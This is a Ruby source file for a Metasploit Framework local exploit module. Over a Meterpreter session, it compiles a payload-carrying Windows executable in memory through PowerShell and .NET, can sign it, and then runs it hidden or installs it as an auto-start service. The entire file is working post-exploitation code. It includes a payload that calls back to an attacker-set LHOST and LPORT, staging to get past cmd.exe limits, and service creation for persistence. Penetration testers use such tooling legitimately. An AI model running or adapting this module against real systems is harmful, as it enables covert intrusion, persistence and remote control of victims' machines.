
##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# Original script comments by nick[at]executionflow.org:
# Meterpreter script to deliver and execute powershell scripts using
# a compression/encoding method based on the powershell PoC code
# from rel1k and winfang98 at DEF CON 18. This script furthers the
# idea by bypassing Windows' command character lmits, allowing the
# execution of very large scripts. No files are ever written to disk.
##


require 'msf/core'
# require 'msf/core/post/windows/services'
require 'msf/core/post/windows/powershell'
require 'msf/core/post/windows/powershell/dot_net'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	# include Msf::Post::Windows::WindowsServices
	include Msf::Post::Windows::Powershell
	include Msf::Post::Windows::Powershell::DotNet

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Powershell Payload Execution",
			'Description'          => %q{
				This module generates a dynamic executable on the session host using .NET templates.
				Code is pulled from C# templates and impregnated with a payload before being
				sent to a modified PowerShell session with .NET 4 loaded. The compiler builds
				the executable (standard or Windows service) in memory and produces a binary
				which can be started/installed and downloaded for later use. After compilation the 
				PoweShell session can also sign the executable if provided a path the a .pfx formatted
				certificate.
			},
			'License'              => MSF_LICENSE,
			'Version'              => '$Revision$',
			'Author'               => [
				'RageLtMan <rageltman[at]sempervictus>', # Module, libs, and powershell-fu
				'Matt "hostess" Andreko' # .NET harness, and requested modifications
			],

			'Payload'        =>  
				{   
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
				{   
					'BufferRegister' => 'EAX',
				},  
			},
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets' => [ [ 'Universal', {} ] ],
			'DefaultTarget' => 0,

		))

		register_options(
			[
				OptBool.new('SVC_GEN', [false, 'Build a Windows service, which defaults to running as localsystem', false ]),
				OptString.new('SVC_NAME', [false, 'Name to use for the Windows Service', 'MsfDynSvc']),
				OptString.new('SVC_DNAME', [false, 'Display Name to use for the Windows Service', 'MsfDynSvc']),
				OptBool.new('START_APP', [false, 'Run EXE/Install Service', true ]),
				OptString.new('OUTPUT_TARGET', [false, 'Name and path of the generated executable, default random, omit extension' ]),
				OptInt.new('COMPILE_DELAY', [true, 'Number of seconds to wait for compiler', 10]),

			], self.class)

		register_advanced_options(
			[
				OptString.new('CERT_PATH', [false, 'Path on host to .pfx fomatted certificate for signing' ]),

			], self.class)

	end

	def exploit

		# Make sure we meet the requirements before running the script
		return 0 if ! (session.type == "meterpreter" || have_powershell?)

		# End of file marker
		eof = Rex::Text.rand_text_alpha(8)
		env_suffix = Rex::Text.rand_text_alpha(8)
		com_opts = {}
		com_opts[:target] = datastore['OUTPUT_TARGET'] || session.fs.file.expand_path('%TEMP%') + "\\#{ Rex::Text.rand_text_alpha(rand(8)+8) }.exe"
		vprint_good("Writing to #{com_opts[:target]}")
		com_opts[:payload] = payload_script
		if datastore['SVC_GEN']
			com_opts[:harness] = File.join(Msf::Config.install_root, 'external', 'source', 'psh_exe', 'dot_net_service.cs')
			com_opts[:assemblies] = ['System.ServiceProcess.dll', 'System.Net.dll', 'System.Configuration.Install.dll']
		else
			com_opts[:harness] = File.join(Msf::Config.install_root, 'external', 'source', 'psh_exe', 'dot_net_exe.cs')
		end

		com_opts[:cert] = datastore['CERT_PATH']

		payload = dot_net_compiler(com_opts)

		# Compress
		print_status('Compressing script contents:')
		compressed_script = compress_script(payload, eof)

		# If the compressed size is > 8100 bytes, launch stager
		if (compressed_script.size > 8100)
			print_error(" - Compressed size: #{compressed_script.size}")
			error_msg =  "Compressed size may cause command to exceed "
			error_msg += "cmd.exe's 8kB character limit."
			print_error(error_msg)
			print_status('Launching stager:')
			script = stage_to_env(compressed_script, env_suffix)
			print_good("Payload successfully staged.")
		else
			print_good(" - Compressed size: #{compressed_script.size}")
			script = compressed_script
		end

		# Execute the powershell script
		print_status('Executing the script.')
		cmd_out, running_pids, open_channels = execute_script(script, 90)
		print_status('Waiting for Compiler')
		Rex::ThreadSafe.sleep(datastore['COMPILE_DELAY'])
		clean_up(nil, eof, running_pids, open_channels, env_suffix, false)

		# Run the harness
		if datastore['START_APP']
			if datastore['SVC_GEN']
				# This should be done with the services mixin, but it creates broken services in testing
				args = "create #{datastore['SVC_NAME']} binPath= #{com_opts[:target].gsub('\\','\\\\')} DisplayName= #{datastore['SVC_DNAME']} start= auto"
				output = cmd_exec('sc.exe', args)
				output += cmd_exec('sc.exe', "start #{datastore['SVC_NAME']}")
				vprint_good(output)
			else
				session.sys.process.execute(com_opts[:target].gsub('\\','\\\\'), nil, {'Hidden' => true, 'Channelized' => true})
			end
		end


		print_good('Finished!')
	end


	# This should be handled by the exploit mixin, right?
	def payload_script
		pay_mod = framework.payloads.create(datastore['PAYLOAD'])
		payload = pay_mod.generate_simple(
			"BadChars"    => '',
			"Format"      => 'raw',
			"Encoder"     => 'x86/alpha_mixed',
			"ForceEncode" => true,
			"Options" => 
			 {
				'LHOST' => datastore['LHOST'],
				'LPORT' => datastore['LPORT'],
				'EXITFUNC' => 'thread',
				'BufferRegister' => 'EAX'
			},
		)

		#vprint_good("AlphanumMixed Encoded Payload:\n\n#{payload}\n\n")
		return payload
	end

end
